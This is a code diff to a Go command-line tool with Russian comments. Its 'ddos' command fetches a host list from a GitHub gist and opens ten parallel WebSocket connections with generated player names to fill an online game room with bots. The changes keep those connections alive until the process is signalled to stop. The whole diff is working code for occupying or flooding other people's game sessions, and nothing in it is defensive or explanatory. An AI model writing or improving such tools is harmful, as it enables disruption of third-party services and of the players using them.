@@ -10,7 +10,9 @@ import ( // Начинаем блок импортов.
 	"net/http"      // Отправляем HTTP запросы к хостам.
 	"net/url"       // Работаем с URL параметрами.
 	"os"            // Читаем аргументы и завершаем процесс с кодом.
+	"os/signal"     // Перехватываем сигналы завершения для корректного закрытия соединений.
 	"strings"       // Работаем со строками для валидации.
+	"syscall"       // Определяем сигналы POSIX для graceful shutdown.
 	"sync"          // Синхронизируем горутины.
 	"time"          // Устанавливаем таймауты для запросов.
 	"unicode"       // Проверяем, является ли символ буквой.
@@ -18,6 +20,8 @@ import ( // Начинаем блок импортов.
 	"github.com/google/uuid"       // Генерируем UUID для user-id.
 	"github.com/gorilla/websocket" // Работаем с WebSocket подключениями.
 ) // Закрываем блок импортов.
+
+const defaultHostsURL = "https://gist.githubusercontent.com/Geardung/67d9695f4f09836364cbe724721d3046/raw/8a72727071a08134eb212a2f5f5df00792107c22/hosts.json" // URL по умолчанию для загрузки списка хостов.
 
 // hostsResponse представляет структуру JSON ответа с хостами.
 // Может быть либо массивом строк, либо объектом с полем hosts.
@@ -266,7 +270,7 @@ func Ddos(args []string) { // Реализация команды ddos.
 	} // Конец проверки никнейма.
 
 	// Загружаем список хостов из JSON файла.
-	hostsURL := "https://gist.githubusercontent.com/Geardung/67d9695f4f09836364cbe724721d3046/raw/8a72727071a08134eb212a2f5f5df00792107c22/hosts.json" // URL для загрузки списка хостов.
+	hostsURL := defaultHostsURL // URL для загрузки списка хостов.
 	hosts, err := fetchHosts(hostsURL)                                                                                                                 // Загружаем хосты.
 	if err != nil {                                                                                                                                    // Если не удалось загрузить хосты.
 		log.Printf("error: failed to fetch hosts: %v", err) // Логируем ошибку.
@@ -327,9 +331,9 @@ func generateRandomName() string { // Функция генерации случ
 } // Конец generateRandomName.
 
 // connectWebSocket создаёт одно WebSocket подключение к комнате игры.
-// Принимает домен хоста, код комнаты, имя игрока и UUID пользователя.
-// Возвращает ошибку, если подключение не удалось.
-func connectWebSocket(hostDomain, code, playerName, userID string) error { // Функция создания WebSocket подключения.
+// Принимает контекст для отмены, домен хоста, код комнаты, имя игрока и UUID пользователя.
+// Возвращает указатель на соединение и nil, или nil и ошибку, если подключение не удалось.
+func connectWebSocket(ctx context.Context, hostDomain, code, playerName, userID string) (*websocket.Conn, error) { // Функция создания WebSocket подключения.
 	// Формируем URL с параметрами.
 	wsURL := url.URL{ // Создаём структуру URL.
 		Scheme:   "wss",                                                                                          // Используем протокол wss (WebSocket Secure).
@@ -341,14 +345,6 @@ func connectWebSocket(hostDomain, code, playerName, userID string) error { // Ф
 	log.Printf("debug: connecting WebSocket to %s", wsURL.String()) // Логируем URL подключения.
 
 	// Создаём заголовки для WebSocket handshake.
-	// ВАЖНО: gorilla/websocket автоматически добавляет следующие заголовки:
-	// - Connection: Upgrade
-	// - Upgrade: websocket
-	// - Sec-WebSocket-Version: 13
-	// - Sec-WebSocket-Key (генерируется автоматически)
-	// - Sec-WebSocket-Extensions (добавляется автоматически при EnableCompression: true)
-	// - Sec-WebSocket-Protocol (устанавливается через Subprotocols в Dialer)
-	// Поэтому мы НЕ устанавливаем эти заголовки вручную, чтобы избежать ошибки "duplicate header".
 	header := make(http.Header)                                                                                                                                     // Создаём карту заголовков.
 	header.Set("Host", hostDomain)                                                                                                                                  // Устанавливаем заголовок Host.
 	header.Set("Pragma", "no-cache")                                                                                                                                // Устанавливаем заголовок Pragma.
@@ -365,65 +361,40 @@ func connectWebSocket(hostDomain, code, playerName, userID string) error { // Ф
 		Subprotocols:      []string{"ecast-v0"}, // Устанавливаем подпротокол ecast-v0.
 	} // Конец создания Dialer.
 
-	// Подключаемся к WebSocket серверу.
-	conn, resp, err := dialer.Dial(wsURL.String(), header) // Выполняем подключение с заголовками.
-	if err != nil {                                        // Если подключение не удалось.
+	// Подключаемся к WebSocket серверу с использованием родительского контекста.
+	conn, resp, err := dialer.DialContext(ctx, wsURL.String(), header) // Выполняем подключение с заголовками и контекстом.
+	if err != nil {                                                     // Если подключение не удалось.
 		if resp != nil { // Если ответ получен.
 			log.Printf("debug: WebSocket connection failed for %s: %v (status: %d)", playerName, err, resp.StatusCode) // Логируем ошибку с статусом.
 		} else { // Если ответа нет.
 			log.Printf("debug: WebSocket connection failed for %s: %v", playerName, err) // Логируем ошибку без статуса.
 		} // Конец проверки ответа.
-		return fmt.Errorf("failed to connect WebSocket: %w", err) // Возвращаем ошибку.
+		return nil, fmt.Errorf("failed to connect WebSocket: %w", err) // Возвращаем nil и ошибку.
 	} // Конец проверки подключения.
 
 	log.Printf("debug: WebSocket connected successfully for %s (user-id: %s)", playerName, userID) // Логируем успешное подключение.
 
-	// Подключение установлено, теперь нужно поддерживать его активным.
-	// Читаем сообщения от сервера в бесконечном цикле, чтобы соединение оставалось открытым.
-	// Устанавливаем таймаут чтения, чтобы периодически проверять, не закрыто ли соединение.
-	conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // Устанавливаем таймаут чтения в 60 секунд.
-
-	// Запускаем горутину для чтения сообщений (чтобы не блокировать возврат функции).
-	go func() { // Запускаем горутину для чтения сообщений.
-		defer conn.Close() // Закрываем соединение при выходе из горутины.
-
-		for { // Бесконечный цикл чтения сообщений.
-			// Читаем сообщение от сервера (тип сообщения не важен, главное - поддерживать соединение).
-			_, message, err := conn.ReadMessage() // Читаем сообщение.
-			if err != nil {                       // Если произошла ошибка чтения.
-				// Проверяем, не была ли это ошибка таймаута (это нормально, просто обновляем таймаут).
-				if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) { // Если это неожиданное закрытие.
-					log.Printf("debug: WebSocket read error for %s: %v", playerName, err) // Логируем ошибку.
-					return                                                                // Выходим из цикла.
-				} // Конец проверки ошибки.
-				// Если это таймаут, просто обновляем его и продолжаем.
-				conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // Обновляем таймаут чтения.
-				continue                                               // Продолжаем цикл.
-			} // Конец проверки ошибки.
-
-			// Сообщение получено (можно добавить обработку позже).
-			_ = message // Игнорируем содержимое сообщения пока.
-
-			// Обновляем таймаут для следующего чтения.
-			conn.SetReadDeadline(time.Now().Add(60 * time.Second)) // Обновляем таймаут чтения.
-		} // Конец бесконечного цикла.
-	}() // Запускаем горутину.
-
-	// Функция возвращается, но соединение остаётся открытым в горутине.
-
-	return nil // Возвращаем nil (ошибки нет).
+	return conn, nil // Возвращаем соединение и nil (ошибки нет).
 } // Конец connectWebSocket.
 
 // ddosing выполняет основную логику заполнения комнаты ботами.
 // Принимает домен хоста, код комнаты, опциональный никнейм и информацию о комнате.
 // Создаёт 10 параллельных WebSocket подключений для заполнения слотов.
+// Блокируется до получения сигнала завершения (SIGINT/SIGTERM), после чего закрывает все соединения.
 func ddosing(hostDomain, code, nickname string, roomInfo *RoomInfo) { // Функция заполнения комнаты.
 	log.Printf("ddosing: hostDomain=%s, code=%s, nickname=%s", hostDomain, code, nickname) // Логируем параметры функции заполнения.
 
 	const numConnections = 10 // Количество параллельных подключений.
 
-	var wg sync.WaitGroup // Создаём WaitGroup для синхронизации горутин.
-	var mu sync.Mutex     // Создаём мьютекс для защиты счётчика.
+	// Создаём контекст с обработкой сигналов для корректного завершения.
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM) // Перехватываем SIGINT и SIGTERM.
+	defer stop()                                                                            // Останавливаем обработку сигналов при выходе.
+
+	var connsMu sync.Mutex                       // Мьютекс для защиты списка соединений.
+	conns := make([]*websocket.Conn, 0, numConnections) // Список активных соединений.
+
+	var wg sync.WaitGroup // Создаём WaitGroup для синхронизации горутин установки подключений.
+	var mu sync.Mutex     // Создаём мьютекс для защиты счётчиков.
 	var successCount int  // Счётчик успешных подключений.
 	var failCount int     // Счётчик неуспешных подключений.
 
@@ -449,16 +420,12 @@ func ddosing(hostDomain, code, nickname string, roomInfo *RoomInfo) { // Фун�
 				playerName = generateRandomName() // Генерируем случайное имя.
 			} // Конец проверки nickname.
 
-			// Добавляем номер подключения к имени для уникальности (если nickname не указан).
-			if !useNickname { // Если nickname не указан.
-				playerName = fmt.Sprintf("%s%d", playerName, connNum) // Добавляем номер к имени.
-			} else { // Если nickname указан.
-				playerName = fmt.Sprintf("%s%d", playerName, connNum) // Добавляем номер к имени для уникальности.
-			} // Конец проверки nickname.
+			// Добавляем номер подключения к имени для уникальности.
+			playerName = fmt.Sprintf("%s%d", playerName, connNum) // Добавляем номер к имени.
 
-			// Создаём WebSocket подключение.
-			err := connectWebSocket(hostDomain, code, playerName, userID) // Выполняем подключение.
-			if err != nil {                                               // Если подключение не удалось.
+			// Создаём WebSocket подключение с родительским контекстом.
+			conn, err := connectWebSocket(ctx, hostDomain, code, playerName, userID) // Выполняем подключение.
+			if err != nil {                                                          // Если подключение не удалось.
 				mu.Lock()                                            // Блокируем мьютекс.
 				failCount++                                          // Увеличиваем счётчик неудач.
 				mu.Unlock()                                          // Разблокируем мьютекс.
@@ -466,21 +433,49 @@ func ddosing(hostDomain, code, nickname string, roomInfo *RoomInfo) { // Фун�
 				return                                               // Выходим из горутины.
 			} // Конец проверки ошибки.
 
+			// Сохраняем соединение в общий список.
+			connsMu.Lock()              // Блокируем мьютекс соединений.
+			conns = append(conns, conn) // Добавляем соединение в список.
+			connsMu.Unlock()            // Разблокируем мьютекс соединений.
+
 			// Подключение успешно установлено.
 			mu.Lock()                                                                              // Блокируем мьютекс.
 			successCount++                                                                         // Увеличиваем счётчик успехов.
 			mu.Unlock()                                                                            // Разблокируем мьютекс.
 			log.Printf("connection %d established: %s (user-id: %s)", connNum, playerName, userID) // Логируем успешное подключение.
-
-			// Держим соединение открытым (можно добавить логику обработки сообщений позже).
-			// Пока просто ждём, чтобы соединение оставалось активным.
-			// В реальном сценарии здесь может быть цикл чтения сообщений от сервера.
 		}(i) // Передаём номер подключения в горутину.
 	} // Конец цикла подключений.
 
-	wg.Wait() // Ждём завершения всех горутин.
+	wg.Wait() // Ждём завершения установки всех подключений.
 
-	// Выводим итоговую статистику.
-	log.Printf("ddosing completed: %d successful, %d failed", successCount, failCount) // Логируем итоговую статистику.
-	fmt.Printf("Connections: %d successful, %d failed\n", successCount, failCount)     // Выводим статистику пользователю.
+	// Запускаем горутины чтения для каждого соединения, чтобы поддерживать их активными.
+	for _, conn := range conns { // Проходим по всем соединениям.
+		go func(c *websocket.Conn) { // Запускаем горутину чтения.
+			c.SetReadDeadline(time.Now().Add(60 * time.Second)) // Устанавливаем таймаут чтения в 60 секунд.
+			for {                                               // Бесконечный цикл чтения сообщений.
+				_, _, err := c.ReadMessage() // Читаем сообщение от сервера.
+				if err != nil {              // Если произошла ошибка чтения.
+					return // Выходим из горутины (соединение закрыто или ошибка).
+				} // Конец проверки ошибки.
+				c.SetReadDeadline(time.Now().Add(60 * time.Second)) // Обновляем таймаут чтения.
+			} // Конец бесконечного цикла.
+		}(conn) // Передаём соединение в горутину.
+	} // Конец запуска горутин чтения.
+
+	// Выводим итоговую статистику установки подключений.
+	log.Printf("ddosing: %d successful, %d failed — waiting for shutdown signal", successCount, failCount) // Логируем статистику.
+	fmt.Printf("Connections: %d successful, %d failed\n", successCount, failCount)                         // Выводим статистику пользователю.
+
+	// Блокируемся до получения сигнала завершения (SIGINT или SIGTERM).
+	<-ctx.Done() // Ждём отмены контекста.
+	log.Printf("shutdown signal received, closing %d connections...", len(conns)) // Логируем получение сигнала.
+
+	// Закрываем все соединения.
+	connsMu.Lock() // Блокируем мьютекс соединений.
+	for _, conn := range conns { // Проходим по всем соединениям.
+		conn.Close() // Закрываем соединение.
+	} // Конец цикла закрытия.
+	connsMu.Unlock() // Разблокируем мьютекс соединений.
+
+	log.Printf("ddosing: all connections closed") // Логируем завершение.
 } // Конец ddosing.
